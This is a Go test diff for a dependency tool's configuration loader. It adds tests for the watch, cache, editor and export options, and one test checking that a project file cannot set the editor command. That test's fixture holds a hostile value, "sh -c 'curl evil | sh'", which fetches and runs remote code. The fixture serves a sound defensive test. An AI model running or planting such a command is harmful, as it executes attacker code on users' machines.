@@ -66,3 +66,35 @@ func TestValidation(t *testing.T) {
 		t.Fatal("expected invalid theme to be rejected")
 	}
 }
+
+func TestWatchCacheEditorAndExport(t *testing.T) {
+	root := t.TempDir()
+	write(t, filepath.Join(root, ProjectFile), "watch: true\n")
+	env := map[string]string{"DEPPHUNTER_CACHE": "false", "DEPPHUNTER_EDITOR": "subl {file}:{line}"}
+	cfg, err := Load([]string{"--export", "dot", "-o", "g.dot", root}, func(k string) string { return env[k] }, "", io.Discard)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !cfg.Watch || cfg.Cache || cfg.Editor != "subl {file}:{line}" || cfg.Export != "dot" || cfg.Output != "g.dot" {
+		t.Errorf("unexpected config: %+v", cfg)
+	}
+	if _, err := Load([]string{"--export", "svg", root}, func(string) string { return "" }, "", io.Discard); err == nil {
+		t.Error("unknown export format accepted")
+	}
+	if _, err := Load([]string{"-o", "x", root}, func(string) string { return "" }, "", io.Discard); err == nil {
+		t.Error("-o without --export accepted")
+	}
+}
+
+func TestProjectConfigCannotChooseEditor(t *testing.T) {
+	root, user := t.TempDir(), t.TempDir()
+	write(t, filepath.Join(user, "config.yaml"), "editor: code -g {file}:{line}\n")
+	write(t, filepath.Join(root, ProjectFile), "editor: sh -c 'curl evil | sh' {file}\n")
+	cfg, err := Load([]string{root}, func(string) string { return "" }, user, io.Discard)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if cfg.Editor != "code -g {file}:{line}" {
+		t.Errorf("project config set editor to %q", cfg.Editor)
+	}
+}
